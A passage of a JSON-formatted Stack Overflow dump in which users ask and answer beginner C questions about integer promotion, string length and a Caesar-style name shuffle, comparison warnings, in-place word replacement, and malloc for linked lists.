"https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 1, "last_activity_date": 1449666287, "creation_date": 1449666287, "answer_id": 34179562, "question_id": 34178147, "link": "https://stackoverflow.com/questions/34178147/is-this-integer-promotion-how-does-it-work/34179562#34179562", "title": "Is this Integer Promotion? How does it work?", "body": "<p><code>a = ~a;</code> You have integer promotion on this line already, since the <code>~</code>, like most operators in C, promotes the operand according to the rules of integer promotion. </p>\n\n<p>The character containing value <code>1</code> gets <em>integer promoted</em> to an <code>int</code> containing the value <code>1</code>, <em>before</em> the operation is done. Assuming 32 bit <code>int</code>, the result of <code>~a</code> is a negative, two complement variable with hex value <code>0xFFFFFFFE</code>.</p>\n\n<p>You then show this result back into the unsigned char, it will truncate the result and only grab the raw binary value of the least significant byte, that is: <code>0xFE</code>.</p>\n\n<blockquote>\n  <p>I also know that the sequence of operation inside printf is from the right. </p>\n</blockquote>\n\n<p>No. The order of evaluation of function parameters in not specified by the standard. The compiler is free to evaluate them in any order it likes, and you cannot know or assume any particular order.</p>\n\n<p>Even more problematic is that there is no <em>sequence point</em> between the evaluation of the different parameters. And since in your case you are using the same variable more than once, each access to the variable is <em>unsequenced</em> and your program invokes undefined behavior. Meaning that anything can happen: weird outputs, program crashes, memory corruption etc etc.</p>\n\n<p>Furthermore, <code>printf</code> is a special case, being an obscure, variadic function. All such functions have particular rules for promotion of the arguments (\"the default argument promotions\"). So regardless of what promotions that happen or don't happen before you pass the result to printf, printf will ruin everything by applying its own integer promotion to the parameter. </p>\n\n<p>So if you wish to toy around with promotion, printf is a very bad choice for displaying the result. Try using the <code>sizeof</code> operator instead. <code>printf(\"%zu\", sizeof(~a));</code> will for example print 4, because of integer promotion.</p>\n"}], "owner": {"reputation": 327, "user_id": 865439, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/b9dc00fa37e79c8b54d2508f75b32564?s=128&d=identicon&r=PG", "display_name": "Tattu", "link": "https://stackoverflow.com/users/865439/tattu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 130, "favorite_count": 0, "accepted_answer_id": 34178514, "answer_count": 2, "score": -1, "last_activity_date": 1449666287, "creation_date": 1449661832, "last_edit_date": 1449663038, "question_id": 34178147, "link": "https://stackoverflow.com/questions/34178147/is-this-integer-promotion-how-does-it-work", "title": "Is this Integer Promotion? How does it work?", "body": "<p>I was just experimenting and I tried out two printf()s.</p>\n\n<pre><code>unsigned char a = 1;\na = ~a;\nprintf(\"----&gt; %x %x %x %x\", ~a, a, ~a, ++a);\n</code></pre>\n\n<p>This one gave the output </p>\n\n<pre><code>----&gt; ffffff00 ff ffffff00 ff\n</code></pre>\n\n<p>Next one was</p>\n\n<pre><code>unsigned char a = 1;\nprintf(\"----&gt; %x %x %x %x\", ~a, a, ~a, ++a);\n</code></pre>\n\n<p>This one gave the output</p>\n\n<pre><code>----&gt; fffffffd 2 fffffffd 2\n</code></pre>\n\n<p>Now, I know what '++' does and '~' does. I also know that the sequence of operation inside printf is from the right. </p>\n\n<p>But could some one explain the difference in the number of bytes printed? A total explanation of output would be helpful of course, but I am more interested in the number of bytes and the difference in both cases [especially in the printf a and ~a parts]. </p>\n\n<p>EDIT:</p>\n\n<p>OK, looks like the ++ part and my mistake of \"I also know that the sequence of operation inside printf is from the right\" has prompted every post other than the answer I was hopefully looking for. So may be the way I asked was wrong. </p>\n\n<p>I will try again,</p>\n\n<pre><code>unsigned char a = ~1;\na = ~a;\nprintf(\"----&gt; %x\", a); \n</code></pre>\n\n<p>OUTPUT: <strong>----> 1</strong></p>\n\n<pre><code>unsigned char a = ~1;\nprintf(\"----&gt; %x\", ~a);\n</code></pre>\n\n<p>OUTPUT: <strong>----> ffffff01</strong></p>\n\n<p>Why this difference? </p>\n"}, {"tags": ["c", "string", "size"], "comments": [{"owner": {"reputation": 3167, "user_id": 502144, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a14b0afdcd244efec7579d4e8bc64b01?s=128&d=identicon&r=PG", "display_name": "fdermishin", "link": "https://stackoverflow.com/users/502144/fdermishin"}, "edited": false, "score": 0, "creation_date": 1449662814, "post_id": 34178112, "comment_id": 56103154, "body": "What names did you typed and what result did you get?"}, {"owner": {"reputation": 3167, "user_id": 502144, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a14b0afdcd244efec7579d4e8bc64b01?s=128&d=identicon&r=PG", "display_name": "fdermishin", "link": "https://stackoverflow.com/users/502144/fdermishin"}, "edited": false, "score": 0, "creation_date": 1449662912, "post_id": 34178112, "comment_id": 56103211, "body": "Are you sure that saving to the file works as you expect?"}, {"owner": {"reputation": 71, "user_id": 5584112, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/3b83234f67b33e774702eca974d803ec?s=128&d=identicon&r=PG&f=1", "display_name": "Thecube", "link": "https://stackoverflow.com/users/5584112/thecube"}, "reply_to_user": {"reputation": 3167, "user_id": 502144, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a14b0afdcd244efec7579d4e8bc64b01?s=128&d=identicon&r=PG", "display_name": "fdermishin", "link": "https://stackoverflow.com/users/502144/fdermishin"}, "edited": false, "score": 0, "creation_date": 1449663119, "post_id": 34178112, "comment_id": 56103341, "body": "Saving the file works as expected, as I did that part before I did this and it is all saving fine"}, {"owner": {"reputation": 3167, "user_id": 502144, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a14b0afdcd244efec7579d4e8bc64b01?s=128&d=identicon&r=PG", "display_name": "fdermishin", "link": "https://stackoverflow.com/users/502144/fdermishin"}, "edited": false, "score": 0, "creation_date": 1449663913, "post_id": 34178112, "comment_id": 56103782, "body": "Try to remove two loops, where you modify <code>lastname</code> and <code>firstname</code>. Then you will see the strings before shuffling, so you will have an idea, why you get 8 characters instead of 5."}, {"owner": {"reputation": 3167, "user_id": 502144, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a14b0afdcd244efec7579d4e8bc64b01?s=128&d=identicon&r=PG", "display_name": "fdermishin", "link": "https://stackoverflow.com/users/502144/fdermishin"}, "edited": false, "score": 0, "creation_date": 1449663966, "post_id": 34178112, "comment_id": 56103827, "body": "Also, look at values of len and fnlen before the loops."}, {"owner": {"reputation": 71, "user_id": 5584112, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/3b83234f67b33e774702eca974d803ec?s=128&d=identicon&r=PG&f=1", "display_name": "Thecube", "link": "https://stackoverflow.com/users/5584112/thecube"}, "reply_to_user": {"reputation": 3167, "user_id": 502144, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a14b0afdcd244efec7579d4e8bc64b01?s=128&d=identicon&r=PG", "display_name": "fdermishin", "link": "https://stackoverflow.com/users/502144/fdermishin"}, "edited": false, "score": 0, "creation_date": 1449664418, "post_id": 34178112, "comment_id": 56104095, "body": "Hmm the number for firstname lenght is 8 when it should be 5 after <code>printf(&quot;%d&quot;, fnlen);</code>, the second lenght is coming out to a 10 digit numbers after <code>printf(&quot;%d&quot;, len);</code> and i did a printf of both first and last name and they are correct."}, {"owner": {"reputation": 3167, "user_id": 502144, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a14b0afdcd244efec7579d4e8bc64b01?s=128&d=identicon&r=PG", "display_name": "fdermishin", "link": "https://stackoverflow.com/users/502144/fdermishin"}, "edited": false, "score": 0, "creation_date": 1449664788, "post_id": 34178112, "comment_id": 56104317, "body": "Take a look at this question: <a href=\"http://stackoverflow.com/questions/2524611/how-to-print-size-t-variable-portably\" title=\"how to print size t variable portably\">stackoverflow.com/questions/2524611/&hellip;</a>"}, {"owner": {"reputation": 71, "user_id": 5584112, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/3b83234f67b33e774702eca974d803ec?s=128&d=identicon&r=PG&f=1", "display_name": "Thecube", "link": "https://stackoverflow.com/users/5584112/thecube"}, "reply_to_user": {"reputation": 3167, "user_id": 502144, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a14b0afdcd244efec7579d4e8bc64b01?s=128&d=identicon&r=PG", "display_name": "fdermishin", "link": "https://stackoverflow.com/users/502144/fdermishin"}, "edited": false, "score": 0, "creation_date": 1449665036, "post_id": 34178112, "comment_id": 56104466, "body": "If i have test as the first name and testing as the second name, on the file output it is firstname is : xiwx\\RRI    Lastname is: testing.  Seems that regardless of the lenght of the name written in for firstname it is always coming out to 8, and the letter shuffle is doing nothing for the lastname"}, {"owner": {"reputation": 952, "user_id": 5640413, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6d07fd20980a84da892b786510152cfe?s=128&d=identicon&r=PG&f=1", "display_name": "Richard St-Cyr", "link": "https://stackoverflow.com/users/5640413/richard-st-cyr"}, "edited": false, "score": 1, "creation_date": 1449665113, "post_id": 34178112, "comment_id": 56104505, "body": "Please post a complete minimal example reproducing the issue. We are missing the way you output the values and the declaration of <code>lastname</code> and <code>firstname</code>."}, {"owner": {"reputation": 71, "user_id": 5584112, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/3b83234f67b33e774702eca974d803ec?s=128&d=identicon&r=PG&f=1", "display_name": "Thecube", "link": "https://stackoverflow.com/users/5584112/thecube"}, "edited": false, "score": 0, "creation_date": 1449665851, "post_id": 34178112, "comment_id": 56104972, "body": "Have edited the code i provided"}, {"owner": {"reputation": 71, "user_id": 5584112, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/3b83234f67b33e774702eca974d803ec?s=128&d=identicon&r=PG&f=1", "display_name": "Thecube", "link": "https://stackoverflow.com/users/5584112/thecube"}, "edited": false, "score": 0, "creation_date": 1449666343, "post_id": 34178112, "comment_id": 56105287, "body": "Fixed the problem, i was redeclaring len and fnlen."}], "answers": [{"comments": [{"owner": {"reputation": 71, "user_id": 5584112, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/3b83234f67b33e774702eca974d803ec?s=128&d=identicon&r=PG&f=1", "display_name": "Thecube", "link": "https://stackoverflow.com/users/5584112/thecube"}, "edited": false, "score": 0, "creation_date": 1449665492, "post_id": 34179215, "comment_id": 56104755, "body": "I declare them at the top as just an integer, i then use the if statement to assign them the number which is the string lenght"}, {"owner": {"reputation": 9942, "user_id": 2876799, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/f4774e789da0e393d56db22b62b9d292?s=128&d=identicon&r=PG&f=1", "display_name": "chasep255", "link": "https://stackoverflow.com/users/2876799/chasep255"}, "reply_to_user": {"reputation": 71, "user_id": 5584112, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/3b83234f67b33e774702eca974d803ec?s=128&d=identicon&r=PG&f=1", "display_name": "Thecube", "link": "https://stackoverflow.com/users/5584112/thecube"}, "edited": false, "score": 0, "creation_date": 1449665566, "post_id": 34179215, "comment_id": 56104800, "body": "Yes but inside the if do not declare them as size_t.  Adding the size_t REDECLARES them as a different variable.  Just say len=strlen(...)"}, {"owner": {"reputation": 71, "user_id": 5584112, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/3b83234f67b33e774702eca974d803ec?s=128&d=identicon&r=PG&f=1", "display_name": "Thecube", "link": "https://stackoverflow.com/users/5584112/thecube"}, "edited": false, "score": 0, "creation_date": 1449666014, "post_id": 34179215, "comment_id": 56105080, "body": "Thank you! That solved most of the issues. As it is now(after your help) when saved the string is doing 1 extra on each, so if i type in test it will be 5 instead of for, should I just -1 from the len and fnlen?"}, {"owner": {"reputation": 9942, "user_id": 2876799, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/f4774e789da0e393d56db22b62b9d292?s=128&d=identicon&r=PG&f=1", "display_name": "chasep255", "link": "https://stackoverflow.com/users/2876799/chasep255"}, "reply_to_user": {"reputation": 71, "user_id": 5584112, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/3b83234f67b33e774702eca974d803ec?s=128&d=identicon&r=PG&f=1", "display_name": "Thecube", "link": "https://stackoverflow.com/users/5584112/thecube"}, "edited": false, "score": 0, "creation_date": 1449666373, "post_id": 34179215, "comment_id": 56105306, "body": "Measure the length after you replace the new line with null because the newline is being counted."}], "tags": [], "owner": {"reputation": 9942, "user_id": 2876799, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/f4774e789da0e393d56db22b62b9d292?s=128&d=identicon&r=PG&f=1", "display_name": "chasep255", "link": "https://stackoverflow.com/users/2876799/chasep255"}, "is_accepted": true, "score": 1, "last_activity_date": 1449665260, "creation_date": 1449665260, "answer_id": 34179215, "question_id": 34178112, "link": "https://stackoverflow.com/questions/34178112/finding-size-of-array-and-word-shuffle/34179215#34179215", "title": "Finding size of array and word shuffle", "body": "<p>The major issue I see with you code is that you are declaring the size_t length variables inside of the if statements.  This way any changes you make to them will not be reflected outside of the if statements.  I am surprised your code compiles given this (unless you also declared another size_t len and fnlen above what you are showing us in which case by redeclaring it inside of the if statement you are shadowing it.)  I would rewrite the code like this.  I think you probably had them declared above and initialized them to zero.  In this case you you declared a completely different variable (with the same name) inside of the if statements it had not effect and the length variables used in the loop still had zero value.</p>\n\n<pre><code>printf(\"Please enter the first name of the player:\");\nsize_t fnlen = 0; //I declare them once outside of the if\nsize_t len = 0;\nif(fgets(firstname, sizeof(firstname), stdin) != NULL)   \n{\n    fnlen = strlen(firstname); //do not redeclare them inside just assign\n} \nprintf(\"Please enter the last name of the player:\");\nif(fgets(lastname, sizeof(lastname), stdin) != NULL)\n{\n    len = strlen(lastname);\n}\nptr = lastname;\nwhile( *ptr != '\\n') ++ptr;    \n*ptr = '\\0';\nfor(i = 0; i &lt; len; i++)\n{\n    lastname[i] = (char)((lastname[i] - 'a' + 6) % 26 + 'a');    \n}\nfor(i = 0; i &lt; fnlen; i++)\n{\n    firstname[i] = (char)((firstname[i] - 'a' + 6) % 26 + 'a');        \n}\n</code></pre>\n"}], "owner": {"reputation": 71, "user_id": 5584112, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/3b83234f67b33e774702eca974d803ec?s=128&d=identicon&r=PG&f=1", "display_name": "Thecube", "link": "https://stackoverflow.com/users/5584112/thecube"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 44, "favorite_count": 0, "accepted_answer_id": 34179215, "answer_count": 1, "score": 0, "last_activity_date": 1449665799, "creation_date": 1449661707, "last_edit_date": 1449665799, "question_id": 34178112, "link": "https://stackoverflow.com/questions/34178112/finding-size-of-array-and-word-shuffle", "title": "Finding size of array and word shuffle", "body": "<p>I am trying to find the lenght of a string using size_t in my program, then using that integer to determine how many times my program loops to perform a letter shuffle (+6 to a letter so a  = g when saved).</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;conio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stddef.h&gt;\n\nint main(void)\n{\n    FILE *file;\n    int i, fnlen, lnlen;\n    char firstname[15], lastname[15],  *ptr;\n\n    fflush(stdin);\n    printf(\"Please enter the first name of the player:\");\n    if(fgets(firstname, sizeof(firstname), stdin) != NULL)\n    {\n        size_t fnlen = strlen(firstname);\n    } \n    printf(\"Please enter the last name of the player:\");\n    if(fgets(lastname, sizeof(lastname), stdin) != NULL)\n    {\n        size_t lnlen = strlen(lastname);\n    }\n\n    for(i = 0; i &lt; lnlen; i++)\n    {\n        lastname[i] = (char)((lastname[i] - 'a' + 4) % 26 + 'a');    \n    }\n    for(i = 0; i &lt; fnlen; i++)\n    {\n        firstname[i] = (char)((firstname[i] - 'a' + 4) % 26 + 'a');        \n    }\n\n    file = fopen(\"text.txt\", \"wt\");\n    if(!file)\n    {\n        printf(\"File is not able to open.\");\n        exit(1);\n    }\n    fprintf(file, \"Firstname is : %s\\n\"\"Lastname is: %s\\n\", firstname, lastname)\n</code></pre>\n\n<p>When I open the file its saved to, the first name is shuffled properly, but has 8 characters when i typed 5, and the lastname is correctly saved, but the letters are no shuffled, they have just output what I input in the fgets</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 16091, "user_id": 4975822, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/c04e8c4c984d36bea8a6239574980fbd?s=128&d=identicon&r=PG&f=1", "display_name": "artm", "link": "https://stackoverflow.com/users/4975822/artm"}, "edited": false, "score": 0, "creation_date": 1449661478, "post_id": 34177931, "comment_id": 56102372, "body": "please edit the code properly."}], "answers": [{"comments": [{"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1449661968, "post_id": 34178014, "comment_id": 56102665, "body": "That&#39;s only the beginning: the same holds for <code>name[i]==&quot; &quot;</code>, <code>b</code> is undefined, <code>strcpy</code> is given characters instead of strings, <code>scanf</code> probably wrong too..."}, {"owner": {"reputation": 16091, "user_id": 4975822, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/c04e8c4c984d36bea8a6239574980fbd?s=128&d=identicon&r=PG&f=1", "display_name": "artm", "link": "https://stackoverflow.com/users/4975822/artm"}, "reply_to_user": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1449662633, "post_id": 34178014, "comment_id": 56103043, "body": "yes, many issues you pointed out, he needs to compile and fix them himself. I updated some anyway."}], "tags": [], "owner": {"reputation": 16091, "user_id": 4975822, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/c04e8c4c984d36bea8a6239574980fbd?s=128&d=identicon&r=PG&f=1", "display_name": "artm", "link": "https://stackoverflow.com/users/4975822/artm"}, "is_accepted": false, "score": 1, "last_activity_date": 1449662573, "last_edit_date": 1449662573, "creation_date": 1449661430, "answer_id": 34178014, "question_id": 34177931, "link": "https://stackoverflow.com/questions/34177931/warning-s-comparison-between-pointer-and-integer/34178014#34178014", "title": "warning: s comparison between pointer and integer", "body": "<p>\"\\0\" is a string, '\\0' is a character. As you comparing a character, you need the latter.</p>\n\n<p>Also, as pointed out by  chqrlie, there are many other issues - you need to check your compiler warnings/errors and fix them all. For example,</p>\n\n<ul>\n<li><code>name[i]==\" \"</code> is wrong with the same reason.</li>\n<li>where is <code>b</code> declared?</li>\n<li>where is <code>i</code> initialized??</li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 101, "user_id": 5291056, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7ec3c9c01c3f08fea9c45cdfa0b28bfb?s=128&d=identicon&r=PG&f=1", "display_name": "zwarrior", "link": "https://stackoverflow.com/users/5291056/zwarrior"}, "is_accepted": false, "score": 0, "last_activity_date": 1449662931, "creation_date": 1449662931, "answer_id": 34178481, "question_id": 34177931, "link": "https://stackoverflow.com/questions/34177931/warning-s-comparison-between-pointer-and-integer/34178481#34178481", "title": "warning: s comparison between pointer and integer", "body": "<p>There are many errors/ warnings in your code.</p>\n\n<ol>\n<li>It should be '\\0'. Not \"\\0\";</li>\n<li>You have not declared b[];</li>\n<li>Initialize i=0;</li>\n<li>Instead of strcpy, you can use another method which is shown in below code.</li>\n<li>Also, you should not use scanf in last line. You should use printf. scanf is used to take input from user. printf is used to print the results.</li>\n</ol>\n\n<p>Code-</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main()\n{\n    int i=0,n;\n    char name[20],b[20];\n    printf(\"Enter name: \");\n    scanf(\"%s\",name);\n    printf(\"Your name is %s\\n\",name);\n    while(name[i]!='\\0') \n    {\n        b[i]=name[i];  // to copy from name[] to b[]. Instead of strcpy\n         i++;\n    }\n    printf(\"copied name: \");\n    for(n=0;n&lt;=i;n++)\n  {\n      printf(\"%c\",b[n]);  // to show the copied result.\n  }\n    printf(\"\\n\");\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 7, "user_id": 5440318, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-VBBAFd_7AHE/AAAAAAAAAAI/AAAAAAAAACg/kz9kpMC4bzc/photo.jpg?sz=128", "display_name": "Sai Ganesh", "link": "https://stackoverflow.com/users/5440318/sai-ganesh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 234, "favorite_count": 0, "closed_date": 1449673300, "answer_count": 2, "score": -4, "last_activity_date": 1449662931, "creation_date": 1449661225, "last_edit_date": 1449661815, "question_id": 34177931, "link": "https://stackoverflow.com/questions/34177931/warning-s-comparison-between-pointer-and-integer", "closed_reason": "Not suitable for this site", "title": "warning: s comparison between pointer and integer", "body": "<p>while i am running the above title is appearing as error</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n int main()\n {\n  int i;\n  char name[20];\n  printf(\"Enter name: \");\n  scanf(\"%s\",name);\n  printf(\"Your name is %s\",name);\n  while(name[i]!=\"\\0\") \n  {\n    i++;\n    if(name[i]==\" \")\n    {\n        strcpy(b[i],name[i]);\n        printf(\"copied name: \");\n        scanf(\"%s\",b[i]);\n    }\n  }\n}\n</code></pre>\n\n<p>while i am running this it is showing this error why? warning: comparison between pointer and integer.</p>\n"}, {"tags": ["c", "arrays", "string"], "comments": [{"owner": {"reputation": 5290, "user_id": 4029561, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/1Wcx1.jpg?s=128&g=1", "display_name": "NSNoob", "link": "https://stackoverflow.com/users/4029561/nsnoob"}, "edited": false, "score": 0, "creation_date": 1449662105, "post_id": 34177910, "comment_id": 56102740, "body": "If it is an assignment, then good on you to work yourself. If this is for work, then <a href=\"http://www.engineersgarage.com/c-language-programs/replacing-word-text\" rel=\"nofollow noreferrer\">how about this</a>?"}, {"owner": {"reputation": 25, "user_id": 5606057, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/880232142084557/picture?type=large", "display_name": "RobertD", "link": "https://stackoverflow.com/users/5606057/robertd"}, "reply_to_user": {"reputation": 5290, "user_id": 4029561, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/1Wcx1.jpg?s=128&g=1", "display_name": "NSNoob", "link": "https://stackoverflow.com/users/4029561/nsnoob"}, "edited": false, "score": 0, "creation_date": 1449663928, "post_id": 34177910, "comment_id": 56103799, "body": "I will try. Thank you."}], "answers": [{"comments": [{"owner": {"reputation": 25, "user_id": 5606057, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/880232142084557/picture?type=large", "display_name": "RobertD", "link": "https://stackoverflow.com/users/5606057/robertd"}, "edited": false, "score": 0, "creation_date": 1449662852, "post_id": 34178238, "comment_id": 56103176, "body": "The text is stored in heap. I tried with <code>strstr</code> too but it looks like it doesn&#39;t work as i want. For example if I have something like this &quot;John has to buy ten apples&quot; and i search for the word &quot;apple&quot;, that function will take &quot;apples&quot; as a good word. For my purpose must be a difference between apples and apple."}, {"owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "reply_to_user": {"reputation": 25, "user_id": 5606057, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/880232142084557/picture?type=large", "display_name": "RobertD", "link": "https://stackoverflow.com/users/5606057/robertd"}, "edited": false, "score": 0, "creation_date": 1449664660, "post_id": 34178238, "comment_id": 56104231, "body": "Then, after you&#39;ve found a match with strstr, you need to look around it to determine if it is indeed a match an resume search if it&#39;s not. (It&#39;s kind of a pain in the butt to do all of this in C.)"}, {"owner": {"reputation": 25, "user_id": 5606057, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/880232142084557/picture?type=large", "display_name": "RobertD", "link": "https://stackoverflow.com/users/5606057/robertd"}, "edited": false, "score": 0, "creation_date": 1449665007, "post_id": 34178238, "comment_id": 56104449, "body": "Ok. I will try to do something concrete. Thanks for help. Hope i won&#39;t face the most adored error &quot;Segemntation fault&quot;."}], "tags": [], "owner": {"reputation": 51929, "user_id": 1084774, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/13403db744d8aa130bb317576cc1df30?s=128&d=identicon&r=PG", "display_name": "PSkocik", "link": "https://stackoverflow.com/users/1084774/pskocik"}, "is_accepted": false, "score": 1, "last_activity_date": 1449662158, "creation_date": 1449662158, "answer_id": 34178238, "question_id": 34177910, "link": "https://stackoverflow.com/questions/34177910/replace-each-word-with-another-word-in-a-given-text-in-c/34178238#34178238", "title": "Replace each word with another word in a given text in C", "body": "<p>If you create a new string, it'll be able to take any string (string literal, an array on the stack, a static array, an array on the heap) as input, but it won't be as memory efficient.</p>\n\n<p>If you want maximum memory efficiency, then you can modify the target string in-place, but you'll have restrictions depending on where the input string is stored.</p>\n\n<ul>\n<li>string literal or possibly a const static array: you can't do anything do anything with it</li>\n<li>stack, or static: you can shrink it</li>\n<li>heap: you can <code>realloc</code> it (shrink it or expand it)</li>\n</ul>\n\n<p>The <code>memmove</code> function might come in handy if you decide to modify the string in place.</p>\n\n<hr>\n\n<p>Keep in mind however, that:</p>\n\n<ol>\n<li>There's no such thing as array arguments in C. They always decay to pointers. </li>\n<li>strtok will modify it's input, so you'd need to make at least one copy if you decide to go with <code>strtok</code></li>\n</ol>\n"}], "owner": {"reputation": 25, "user_id": 5606057, "user_type": "registered", "accept_rate": 75, "profile_image": "https://graph.facebook.com/880232142084557/picture?type=large", "display_name": "RobertD", "link": "https://stackoverflow.com/users/5606057/robertd"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 84, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1449662158, "creation_date": 1449661174, "last_edit_date": 1449661518, "question_id": 34177910, "link": "https://stackoverflow.com/questions/34177910/replace-each-word-with-another-word-in-a-given-text-in-c", "title": "Replace each word with another word in a given text in C", "body": "<p>I have to make a function which replaces each word (x), with another word(y), in a given text(**string). Can I replace them directly in the given text? Or should I make a new array and make the replacements there? However and don't know how to continue.\nThe code I wrote is:</p>\n\n<pre><code>void operation_2(char x[100], char y[100], char **string, int N)\n{\n    int len = 0;\n    char *word;\n    char s[12] = \" .,?!\\\"';:\";\n    char **newstring = (char **)malloc(N * sizeof(char *));\n\n    for (i = 0; i&lt;= N; i++) {\n            word = strtok(string[i], s);\n            while (word != NULL) {\n                    if (strcmp(word, x) == 0) {\n                            len = strlen(string[i]) - strlen(x) + strlen(y);\n                            newstring[i] = (char *)malloc((len + 1) * sizeof(char));\n</code></pre>\n"}, {"tags": ["c", "pointers", "memory", "malloc", "dynamic-memory-allocation"], "comments": [{"owner": {"reputation": 180, "user_id": 5565110, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4fb39d1c89ba9883b693075c1fad580?s=128&d=identicon&r=PG&f=1", "display_name": "Jonny Whatshisface", "link": "https://stackoverflow.com/users/5565110/jonny-whatshisface"}, "edited": false, "score": 0, "creation_date": 1449661149, "post_id": 34177730, "comment_id": 56102169, "body": "I love how someone down voted this... Whoever did that must not have gotten very much love as a child."}], "answers": [{"comments": [{"owner": {"reputation": 180, "user_id": 5565110, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4fb39d1c89ba9883b693075c1fad580?s=128&d=identicon&r=PG&f=1", "display_name": "Jonny Whatshisface", "link": "https://stackoverflow.com/users/5565110/jonny-whatshisface"}, "edited": false, "score": 0, "creation_date": 1449662141, "post_id": 34178090, "comment_id": 56102755, "body": "So that being said, is it better to just individually malloc() for each wrapper and assign next and prev then and there during each iteration, and just free each one as need be? And, what&#39;s the overhead (not that it&#39;s as important in a case like this, I suppose) when malloc&#39;ing 50 wrappers individually versus in one big hit? And how does that affect whether or not the memory will be contiguous ?"}, {"owner": {"reputation": 8430, "user_id": 3555525, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/3ba5dbe6c89022c8af714c8d841f9547?s=128&d=identicon&r=PG&f=1", "display_name": "Rishikesh Raje", "link": "https://stackoverflow.com/users/3555525/rishikesh-raje"}, "reply_to_user": {"reputation": 180, "user_id": 5565110, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4fb39d1c89ba9883b693075c1fad580?s=128&d=identicon&r=PG&f=1", "display_name": "Jonny Whatshisface", "link": "https://stackoverflow.com/users/5565110/jonny-whatshisface"}, "edited": false, "score": 0, "creation_date": 1449662626, "post_id": 34178090, "comment_id": 56103035, "body": "It is better to individually malloc, as mentioned above. The overhead should not be too much to do so, but that depends on your system. The memory will not be contiguous. It is not required to be so, as you have pointers to the next and previous location available."}, {"owner": {"reputation": 180, "user_id": 5565110, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d4fb39d1c89ba9883b693075c1fad580?s=128&d=identicon&r=PG&f=1", "display_name": "Jonny Whatshisface", "link": "https://stackoverflow.com/users/5565110/jonny-whatshisface"}, "edited": false, "score": 0, "creation_date": 1449663213, "post_id": 34178090, "comment_id": 56103392, "body": "I agree that the requirement isn&#39;t there - but wouldn&#39;t the performance be degraded a bit by the memory not being contiguous? 